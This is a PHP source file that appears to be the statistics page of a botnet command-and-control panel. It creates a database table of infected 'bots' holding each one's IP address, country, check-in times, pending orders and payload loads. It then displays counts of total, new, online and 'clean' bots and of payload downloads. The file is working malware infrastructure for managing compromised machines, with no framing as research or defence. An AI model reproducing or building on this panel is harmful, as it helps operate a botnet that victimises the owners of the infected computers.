<?php

if(!defined('GRANTED')) die;

include '../include/mysql.php';
mysql_connect($db_host, $db_user, $db_pass) or die('<font color=red>SQL connection filed!</font>');
mysql_select_db($db_name) or die('<font color=red>DataBase not found "'.$db_name.'"!</font>');

 $query = "CREATE TABLE IF NOT EXISTS `bots`(`id` varchar(8) NOT NULL, `ip` int(10) unsigned  NOT NULL, `country` tinyint(3) unsigned  NOT NULL, `birthday` int(10) unsigned NOT NULL, `version` int(10) unsigned NOT NULL, `lastknock` int(10) unsigned NOT NULL, `nextload` int(10) unsigned NOT NULL, `orders` text NOT NULL, `onboard` tinyint(3) unsigned NOT NULL, `il` varchar(1) NOT NULL, `vr` varchar(4) NOT NULL,`bt` varchar(2) NOT NULL, KEY  (`id`) ) ENGINE=MyISAM";

mysql_query( $query ); 

$row = mysql_fetch_array(mysql_query('SELECT COUNT(*), SUM(onboard) FROM bots'));
$btotn = $row[0];
$tloads = intval($row[1]);
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE birthday>'.(time()-86400)));
$btotd = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE birthday>'.(time()-3600)));
$btoth = $row[0];


$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-$delay)));
$bonn = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-86400)));
$bond = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-3600)));
$bonh = $row[0];


$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0'));
$bcln = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0 AND lastknock>'.(time()-86400)));
$bcld = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0 AND lastknock>'.(time()-3600)));
$bclh = $row[0];

$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE nextload>'.(time()-86400)));
$bdld = $row[0];

echo '<table align=center width=1154 style="margin-top:-2px;margin-bottom:3px;" cellpadding=1 cellspacing=1>
<tr>
	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Main stats</td></tr>
	<tr>
		<td align=right>Total number of bots:</td>
		<td align=left width=60px><b>'.$btotn.'</b></td>
	</tr>
	<tr>
		<td align=right>New bots per day:</td>
		<td align=left><b>'.$btotd.'</b></td>
	</tr>
	<tr>
		<td align=right>New bots per hour:</td>
		<td align=left><b>'.$btoth.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Online stats</td></tr>
	<tr>
		<td align=right>Total number of online bots:</td>
		<td align=left width=60px><b>'.$bonn.'</b></td>
	</tr>
	<tr>
		<td align=right>Online bots per day:</td>
		<td align=left><b>'.$bond.'</b></td>
	</tr>
	<tr>
		<td align=right>Online bots per hour:</td>
		<td align=left><b>'.$bonh.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Stats of clean</td></tr>
	<tr>
		<td align=right>Total number of clean:</td>
		<td align=left width=60px><b>'.$bcln.'</b></td>
	</tr>
	<tr>
		<td align=right>Clean bots per day:</td>
		<td align=left><b>'.$bcld.'</b></td>
	</tr>
	<tr>
		<td align=right>Clean bots per hour:</td>
		<td align=left><b>'.$bclh.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Downloads stats:</td></tr>
	<tr>
		<td align=right>Total downloads:</td>
		<td align=left width=60px><b>'.$tloads.'</b></td>
	</tr>
	<tr>
		<td align=right>The average load on the bot:</td>
		<td align=left><b>'.round($tloads/$btotn, 2).'</b></td>
	</tr>
	<tr>
		<td align=right>Temporarily banned bots:</td>
		<td align=left><b>'.$bdld.'</b></td>
	</tr>
	</table>
	</td>
</tr>
</table>';

?>